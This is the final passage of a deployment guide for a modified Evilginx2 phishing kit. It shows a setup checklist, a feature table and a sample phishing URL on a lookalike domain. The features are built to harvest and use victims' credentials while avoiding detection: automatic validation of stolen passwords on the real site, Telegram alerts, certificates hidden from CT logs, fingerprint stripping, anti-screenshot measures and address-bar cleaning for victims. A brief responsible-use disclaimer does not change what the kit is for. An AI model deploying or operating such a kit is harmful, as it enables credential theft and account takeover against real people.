- [ ] Phishing URL obtained and works in browser
- [ ] Login page looks like the real website

### ✅ Dashboard
- [ ] Dashboard accessible at `http://IP:5000`
- [ ] Login works (`admin` / password)
- [ ] Sessions shown (even if empty)
- [ ] Dark mode toggles
- [ ] Export buttons work

### ✅ Systemd Service
- [ ] Service file created
- [ ] Service enabled (starts on boot)
- [ ] Service is `active (running)`
- [ ] Reboot test passed (runs after reboot)

### ✅ Optional Features
- [ ] Live Feed running (if configured)
- [ ] Turnstile CAPTCHA working (if configured)
- [ ] VPN blocking active (if configured)
- [ ] Country blocking active (if configured)

---

## Summary: What You Now Have

Your fully deployed Evilginx2 server includes:

| Component | Status |
|-----------|--------|
| 🔒 Wildcard SSL Certificate | ✅ Covers all subdomains, hidden from CT logs |
| 📊 Web Dashboard (port 5000) | ✅ View, search, filter, export sessions |
| 📱 Telegram Notifications | ✅ Instant alerts to your phone |
| 🌍 GeoIP Tracking | ✅ Country, city, VPN detection per visitor |
| ✅ Credential Validation | ✅ Auto-tests if passwords work on real site |
| 🛡️ Header Stripping | ✅ Evilginx fingerprints removed |
| 🎲 CSS Randomization | ✅ Anti-screenshot detection active |
| 🔍 Extension Detection | ✅ Detects ad-blockers and automation tools |
| 📝 URL Rewriting | ✅ Clean address bar for victims |
| 🚀 Auto-Start on Boot | ✅ Survives reboots |
| ♻️ Auto-Restart on Crash | ✅ Recovers from failures |
| 🌐 DNS Server | ✅ Built-in, handles all subdomains |
| 🚫 Blacklist System | ✅ Blocks unauthorized visitors |
| 🔄 Certificate Auto-Renewal | ✅ Cron job configured |

**Your phishing URL is:** `https://login.officialmonsterz.store/XXXXXXXXX` (run `lures get-url 0` to see it)

---

## Final Words

You've just deployed a sophisticated security testing framework. Use it responsibly and only on systems you own or have explicit written permission to test.

**Key security tips:**
1. Change the dashboard password immediately (use a strong one)
2. Never share your phishing URL publicly
3. Don't test on domains you don't own without written permission
4. Monitor your VPS for abuse (check logs regularly)
5. Keep your system updated (`apt update && apt upgrade` monthly)

**Need help?**
- Telegram: https://t.me/officialmonsterz
- GitHub Issues: https://github.com/afrikaquality/evilginx2/issues
- Email: Check the repository for contact info

---

*Evilginx2 Telegram Edition by @officialmonsterz*
*Based on the original work by Kuba Gretzky (@mrgretzky)*
